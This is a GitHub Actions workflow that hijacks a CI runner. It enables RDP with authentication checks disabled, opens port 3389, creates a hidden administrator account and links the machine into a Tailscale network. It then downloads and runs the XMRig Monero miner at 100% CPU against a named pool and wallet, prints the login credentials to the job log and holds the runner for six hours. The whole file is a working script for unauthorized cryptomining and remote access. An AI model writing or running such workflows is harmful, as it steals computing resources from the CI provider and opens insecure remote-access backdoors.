name: RDP Powerhouse
on:
  workflow_dispatch:

jobs:
  rdp-and-mine:
    # Let's ask for a big boy runner. If it complains, just use windows-latest.
    runs-on: windows-xlarge
    timeout-minutes: 360 # 6 hours of pure power

    steps:
      - name: Configure RDP & Punch a Hole in the Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="FUCK_YEAH_RDP" dir=in action=allow protocol=TCP localport=3389

      - name: Create God-Mode RDP User
        run: |
          $password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 20)
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      - name: Install Tailscale
        run: |
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\ts.exe"
          Start-Process -FilePath "$env:TEMP\ts.exe" -ArgumentList "/S" -Wait

      - name: Connect to Tailscale Network
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-beast-$env:GITHUB_RUN_ID
          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      
      - name: Unleash the Beast (CPU/RAM MAX OUT)
        shell: powershell
        run: |
          Write-Host "Downloading and starting XMRig to max out the CPU. Let's make some money."
          $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
          $minerZip = "$env:TEMP\miner.zip"
          $minerDir = "$env:TEMP\miner"
          
          Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip
          Expand-Archive -Path $minerZip -DestinationPath $minerDir -Force
          
          # --- !! REPLACE POOL AND WALLET ADDRESS BELOW !! ---
          $pool = "gulf.moneroocean.stream:10128"
          $wallet = "48dafHj2RkTMiV2Wp493aFF6jod196S4sK8pS11y4K6p1pBE2F3a3m8e5j9g6d1b2N4M7h5e9r1kXz6C3a5b8V7d"
          # ---------------------------------------------------
          
          Write-Host "Starting miner. This will use 100% CPU."
          Start-Process -FilePath "$minerDir\xmrig-6.21.3\xmrig.exe" -ArgumentList "-o $pool -u $wallet -k --cpu-max-threads-hint=100"

      - name: Display Credentials and Hang
        run: |
          Write-Host "================ RDP ACCESS & MINING ================"
          Write-Host "Address:  $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "STATUS:   MINING IN BACKGROUND - CPU at 100%"
          Write-Host "==================================================="
          Start-Sleep -Seconds 21600
